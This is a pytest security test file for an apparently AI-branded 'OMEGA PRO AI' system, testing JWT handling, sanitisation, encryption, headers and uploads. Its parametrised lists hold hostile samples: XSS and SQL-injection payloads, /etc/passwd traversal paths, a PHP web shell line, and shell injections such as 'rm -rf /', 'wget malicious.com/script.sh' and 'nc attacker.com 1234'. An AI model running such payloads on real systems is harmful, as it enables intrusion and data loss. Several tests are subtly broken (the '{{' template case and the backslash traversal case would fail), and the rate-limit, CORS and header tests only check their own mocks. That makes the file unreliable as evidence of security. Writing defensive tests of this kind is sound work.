"""
OMEGA PRO AI v10.1 - Automated Security Tests
Comprehensive security testing for the OMEGA system
"""

import pytest
import os
import sys
import json
import hashlib
import time
import subprocess
import tempfile
from unittest.mock import patch, MagicMock
import requests
import jwt
from datetime import datetime, timedelta

# Add project root to path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))


class TestAuthenticationSecurity:
    """Test authentication and authorization security"""
    
    def test_jwt_token_validation(self):
        """Test JWT token validation security"""
        secret_key = "test_secret_key_for_testing"
        
        # Test valid token
        valid_payload = {
            "user_id": "test_user",
            "exp": datetime.utcnow() + timedelta(hours=1),
            "iat": datetime.utcnow()
        }
        
        try:
            valid_token = jwt.encode(valid_payload, secret_key, algorithm="HS256")
            decoded = jwt.decode(valid_token, secret_key, algorithms=["HS256"])
            assert decoded["user_id"] == "test_user"
        except ImportError:
            pytest.skip("PyJWT not available")
    
    def test_expired_token_rejection(self):
        """Test rejection of expired tokens"""
        secret_key = "test_secret_key_for_testing"
        
        # Test expired token
        expired_payload = {
            "user_id": "test_user",
            "exp": datetime.utcnow() - timedelta(hours=1),  # Expired
            "iat": datetime.utcnow() - timedelta(hours=2)
        }
        
        try:
            expired_token = jwt.encode(expired_payload, secret_key, algorithm="HS256")
            
            with pytest.raises(jwt.ExpiredSignatureError):
                jwt.decode(expired_token, secret_key, algorithms=["HS256"])
        except ImportError:
            pytest.skip("PyJWT not available")
    
    def test_invalid_signature_rejection(self):
        """Test rejection of tokens with invalid signatures"""
        secret_key = "test_secret_key_for_testing"
        wrong_key = "wrong_secret_key"
        
        payload = {
            "user_id": "test_user",
            "exp": datetime.utcnow() + timedelta(hours=1)
        }
        
        try:
            token = jwt.encode(payload, secret_key, algorithm="HS256")
            
            with pytest.raises(jwt.InvalidSignatureError):
                jwt.decode(token, wrong_key, algorithms=["HS256"])
        except ImportError:
            pytest.skip("PyJWT not available")
    
    def test_password_hashing_security(self):
        """Test password hashing security"""
        import hashlib
        import secrets
        
        password = "test_password_123"
        
        # Test that passwords are properly hashed
        salt = secrets.token_hex(16)
        hashed = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
        
        # Hash should be different from plain password
        assert hashed != password.encode()
        assert len(hashed) == 32  # SHA256 produces 32-byte hash
        
        # Same password with same salt should produce same hash
        hashed2 = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
        assert hashed == hashed2
    
    def test_rate_limiting_protection(self):
        """Test rate limiting protection"""
        mock_response = MagicMock()
        mock_response.status_code = 429
        mock_response.json.return_value = {"error": "Rate limit exceeded"}
        
        with patch('requests.post', return_value=mock_response):
            # Simulate rapid authentication attempts
            for _ in range(10):
                response = requests.post(
                    "http://localhost:8000/api/v1/auth/login",
                    json={"username": "test", "password": "test"}
                )
            
            # Should eventually be rate limited
            assert response.status_code == 429
    
    def test_session_management_security(self):
        """Test session management security"""
        # Mock session data
        session_data = {
            "user_id": "test_user",
            "created_at": time.time(),
            "expires_at": time.time() + 3600,
            "csrf_token": "random_csrf_token_123"
        }
        
        # Test session expiry
        expired_session = session_data.copy()
        expired_session["expires_at"] = time.time() - 1
        
        assert expired_session["expires_at"] < time.time()  # Should be expired
        
        # Test CSRF token presence
        assert "csrf_token" in session_data
        assert len(session_data["csrf_token"]) > 10


class TestInputValidationSecurity:
    """Test input validation and sanitization"""
    
    @pytest.mark.parametrize("malicious_input", [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "{{ 7*7 }}",  # Template injection
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        "' OR '1'='1",
        "admin'/**/OR/**/1=1#"
    ])
    def test_malicious_input_sanitization(self, malicious_input):
        """Test sanitization of malicious inputs"""
        
        def sanitize_input(input_string):
            """Simple sanitization function"""
            dangerous_chars = ['<', '>', '"', "'", '&', '/', '\\', ';', '(', ')']
            for char in dangerous_chars:
                input_string = input_string.replace(char, '')
            return input_string
        
        sanitized = sanitize_input(malicious_input)
        
        # Sanitized input should not contain dangerous characters
        dangerous_patterns = ['<script>', 'DROP TABLE', '../', '{{', 'javascript:', 'onerror=']
        for pattern in dangerous_patterns:
            assert pattern.lower() not in sanitized.lower()
    
    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        malicious_queries = [
            "1' OR '1'='1",
            "1; DROP TABLE users;",
            "' UNION SELECT * FROM passwords --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --"
        ]
        
        for query in malicious_queries:
            # Simulate parameterized query (safe approach)
            safe_query = "SELECT * FROM results WHERE id = ?"
            parameters = (query,)  # Query as parameter, not concatenated
            
            # The malicious input becomes just a parameter value
            assert query in parameters
            assert "DROP TABLE" not in safe_query
            assert "UNION SELECT" not in safe_query
    
    def test_xss_prevention(self):
        """Test Cross-Site Scripting (XSS) prevention"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "' onmouseover='alert(1)'"
        ]
        
        def escape_html(text):
            """HTML escaping function"""
            escape_chars = {
                '<': '&lt;',
                '>': '&gt;',
                '"': '&quot;',
                "'": '&#x27;',
                '&': '&amp;'
            }
            
            for char, escape in escape_chars.items():
                text = text.replace(char, escape)
            return text
        
        for payload in xss_payloads:
            escaped = escape_html(payload)
            
            # Escaped content should not contain executable script tags
            assert '<script>' not in escaped
            assert 'onerror=' not in escaped
            assert 'javascript:' not in escaped
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "/var/log/../../etc/passwd",
            "file:///etc/passwd"
        ]
        
        def sanitize_path(path):
            """Path sanitization function"""
            # Remove dangerous path components
            dangerous_components = ['../', '..\\', '/etc/', '/var/', 'file://']
            for component in dangerous_components:
                path = path.replace(component, '')
            return path
        
        for path in malicious_paths:
            sanitized = sanitize_path(path)
            
            # Sanitized path should not contain directory traversal
            assert '../' not in sanitized
            assert '..\\' not in sanitized
            assert '/etc/' not in sanitized
    
    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        malicious_commands = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test || wget malicious.com/script.sh",
            "test `whoami`",
            "test $(id)",
            "test | nc attacker.com 1234"
        ]
        
        def sanitize_command_input(input_string):
            """Command input sanitization"""
            dangerous_chars = [';', '&&', '||', '`', '$', '|', '&', '>', '<']
            for char in dangerous_chars:
                input_string = input_string.replace(char, '')
            return input_string
        
        for command in malicious_commands:
            sanitized = sanitize_command_input(command)
            
            # Should not contain command injection characters
            assert ';' not in sanitized
            assert '&&' not in sanitized
            assert '||' not in sanitized
            assert '`' not in sanitized


class TestDataProtectionSecurity:
    """Test data protection and encryption"""
    
    def test_sensitive_data_encryption(self):
        """Test encryption of sensitive data"""
        try:
            from cryptography.fernet import Fernet
            
            # Generate encryption key
            key = Fernet.generate_key()
            cipher_suite = Fernet(key)
            
            # Test data encryption
            sensitive_data = "user_password_123"
            encrypted_data = cipher_suite.encrypt(sensitive_data.encode())
            
            # Encrypted data should be different from original
            assert encrypted_data != sensitive_data.encode()
            
            # Test decryption
            decrypted_data = cipher_suite.decrypt(encrypted_data).decode()
            assert decrypted_data == sensitive_data
            
        except ImportError:
            pytest.skip("cryptography library not available")
    
    def test_data_masking(self):
        """Test sensitive data masking"""
        sensitive_info = {
            "credit_card": "1234567890123456",
            "ssn": "123-45-6789",
            "email": "user@example.com",
            "phone": "+1234567890"
        }
        
        def mask_sensitive_data(data_type, value):
            """Data masking function"""
            if data_type == "credit_card":
                return "*" * 12 + value[-4:]
            elif data_type == "ssn":
                return "***-**-" + value[-4:]
            elif data_type == "email":
                username, domain = value.split('@')
                return username[:2] + "*" * (len(username) - 2) + "@" + domain
            elif data_type == "phone":
                return "*" * (len(value) - 4) + value[-4:]
            return value
        
        for data_type, value in sensitive_info.items():
            masked = mask_sensitive_data(data_type, value)
            
            # Masked data should not expose full sensitive information
            if data_type == "credit_card":
                assert masked.count("*") >= 12
            elif data_type == "ssn":
                assert "***-**-" in masked
    
    def test_secure_random_generation(self):
        """Test secure random number generation"""
        import secrets
        
        # Generate secure random token
        token = secrets.token_urlsafe(32)
        assert len(token) >= 32
        
        # Generate multiple tokens to ensure randomness
        tokens = [secrets.token_urlsafe(16) for _ in range(10)]
        
        # All tokens should be unique
        assert len(set(tokens)) == len(tokens)
        
        # Test secure random integers
        random_int = secrets.randbelow(1000)
        assert 0 <= random_int < 1000
    
    def test_data_validation_types(self):
        """Test data type validation"""
        
        def validate_data_type(value, expected_type):
            """Data type validation"""
            if expected_type == "int":
                try:
                    int(value)
                    return True
                except ValueError:
                    return False
            elif expected_type == "float":
                try:
                    float(value)
                    return True
                except ValueError:
                    return False
            elif expected_type == "email":
                import re
                email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
                return re.match(email_pattern, str(value)) is not None
            return False
        
        test_cases = [
            ("123", "int", True),
            ("abc", "int", False),
            ("123.45", "float", True),
            ("user@example.com", "email", True),
            ("invalid_email", "email", False)
        ]
        
        for value, data_type, expected in test_cases:
            result = validate_data_type(value, data_type)
            assert result == expected


class TestAPISecurityTesting:
    """Test API security measures"""
    
    def test_cors_configuration(self):
        """Test CORS configuration security"""
        mock_response = MagicMock()
        mock_response.headers = {
            'Access-Control-Allow-Origin': 'https://trusted-domain.com',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
            'Access-Control-Allow-Headers': 'Content-Type, Authorization',
            'Access-Control-Max-Age': '3600'
        }
        
        with patch('requests.options', return_value=mock_response):
            response = requests.options("http://localhost:8000/api/v1/predict")
            
            # CORS should be properly configured
            assert 'Access-Control-Allow-Origin' in response.headers
            assert response.headers['Access-Control-Allow-Origin'] != '*'  # Should not be wildcard in production
    
    def test_https_enforcement(self):
        """Test HTTPS enforcement"""
        # Test HTTP to HTTPS redirect
        mock_response = MagicMock()
        mock_response.status_code = 301
        mock_response.headers = {'Location': 'https://example.com/api/v1/predict'}
        
        with patch('requests.get', return_value=mock_response):
            response = requests.get("http://example.com/api/v1/predict")
            
            # Should redirect to HTTPS
            assert response.status_code == 301
            assert response.headers['Location'].startswith('https://')
    
    def test_security_headers(self):
        """Test security headers presence"""
        expected_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy'
        ]
        
        mock_response = MagicMock()
        mock_response.headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
            'Content-Security-Policy': "default-src 'self'"
        }
        
        with patch('requests.get', return_value=mock_response):
            response = requests.get("http://localhost:8000/api/v1/health")
            
            for header in expected_headers:
                assert header in response.headers
    
    def test_request_size_limits(self):
        """Test request size limits"""
        # Test large request rejection
        large_payload = {"data": "x" * 10000000}  # 10MB payload
        
        mock_response = MagicMock()
        mock_response.status_code = 413
        mock_response.json.return_value = {"error": "Request entity too large"}
        
        with patch('requests.post', return_value=mock_response):
            response = requests.post(
                "http://localhost:8000/api/v1/predict",
                json=large_payload
            )
            
            assert response.status_code == 413
    
    def test_api_versioning_security(self):
        """Test API versioning security"""
        # Test that old API versions are properly handled
        mock_response = MagicMock()
        mock_response.status_code = 410
        mock_response.json.return_value = {"error": "API version deprecated"}
        
        with patch('requests.get', return_value=mock_response):
            # Test deprecated API version
            response = requests.get("http://localhost:8000/api/v0.1/predict")
            
            # Old versions should be properly deprecated
            assert response.status_code in [410, 404]


class TestFileSystemSecurity:
    """Test file system security measures"""
    
    def test_file_upload_security(self):
        """Test file upload security measures"""
        dangerous_files = [
            {"filename": "malicious.exe", "content": b"MZ\x90\x00"},  # PE header
            {"filename": "script.php", "content": b"<?php system($_GET['cmd']); ?>"},
            {"filename": "test.sh", "content": b"#!/bin/bash\nrm -rf /"},
            {"filename": "../../../etc/passwd", "content": b"root:x:0:0"}
        ]
        
        def validate_file_upload(filename, content):
            """File upload validation"""
            # Check file extension
            allowed_extensions = ['.csv', '.json', '.txt', '.pdf']
            file_ext = os.path.splitext(filename)[1].lower()
            
            if file_ext not in allowed_extensions:
                return False
            
            # Check for path traversal
            if '..' in filename or '/' in filename:
                return False
            
            # Check file content (basic)
            dangerous_signatures = [b'MZ\x90', b'<?php', b'#!/bin/bash']
            for signature in dangerous_signatures:
                if content.startswith(signature):
                    return False
            
            return True
        
        for file_info in dangerous_files:
            is_safe = validate_file_upload(file_info["filename"], file_info["content"])
            assert not is_safe  # All dangerous files should be rejected
    
    def test_file_permissions_security(self):
        """Test file permissions security"""
        # Create temporary test file
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as temp_file:
            temp_file.write("test data")
            temp_file_path = temp_file.name
        
        try:
            # Check file permissions
            file_stat = os.stat(temp_file_path)
            file_permissions = oct(file_stat.st_mode)[-3:]
            
            # File should not be world-writable
            assert file_permissions[-1] != '7'  # Others should not have full access
            
        finally:
            # Clean up
            os.unlink(temp_file_path)
    
    def test_directory_traversal_protection(self):
        """Test directory traversal protection"""
        base_directory = "/tmp/omega_test"
        
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/.../.../.../etc/passwd",
            "file:///etc/passwd"
        ]
        
        def is_safe_path(base_dir, user_path):
            """Check if path is safe from directory traversal"""
            # Normalize paths
            base_dir = os.path.abspath(base_dir)
            full_path = os.path.abspath(os.path.join(base_dir, user_path))
            
            # Check if the full path is within the base directory
            return full_path.startswith(base_dir)
        
        for path in dangerous_paths:
            is_safe = is_safe_path(base_directory, path)
            assert not is_safe  # All dangerous paths should be rejected


class TestNetworkSecurity:
    """Test network security measures"""
    
    def test_tls_configuration(self):
        """Test TLS configuration security"""
        mock_ssl_context = MagicMock()
        mock_ssl_context.check_hostname = True
        mock_ssl_context.verify_mode = 2  # CERT_REQUIRED
        
        # Test SSL/TLS settings
        assert mock_ssl_context.check_hostname is True
        assert mock_ssl_context.verify_mode == 2
    
    def test_firewall_rules_simulation(self):
        """Test firewall rules simulation"""
        allowed_ports = [80, 443, 8000, 8080]
        blocked_ports = [22, 23, 21, 135, 139, 445]
        
        def is_port_allowed(port):
            """Simulate firewall port filtering"""
            return port in allowed_ports
        
        # Test allowed ports
        for port in allowed_ports:
            assert is_port_allowed(port) is True
        
        # Test blocked ports
        for port in blocked_ports:
            assert is_port_allowed(port) is False
    
    def test_ip_whitelisting(self):
        """Test IP whitelisting functionality"""
        whitelist = [
            "127.0.0.1",
            "10.0.0.0/8",
            "192.168.1.0/24"
        ]
        
        def is_ip_whitelisted(ip_address):
            """Simple IP whitelisting check"""
            # For this test, just check exact matches and simple ranges
            if ip_address in whitelist:
                return True
            
            # Check if IP is in localhost range
            if ip_address.startswith("127."):
                return True
            
            # Check private IP ranges (simplified)
            if ip_address.startswith("10.") or ip_address.startswith("192.168."):
                return True
            
            return False
        
        test_cases = [
            ("127.0.0.1", True),
            ("192.168.1.100", True),
            ("10.0.0.50", True),
            ("8.8.8.8", False),  # Public IP, should be blocked
            ("172.16.0.1", False)  # Not in simple whitelist
        ]
        
        for ip, expected in test_cases:
            result = is_ip_whitelisted(ip)
            assert result == expected


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])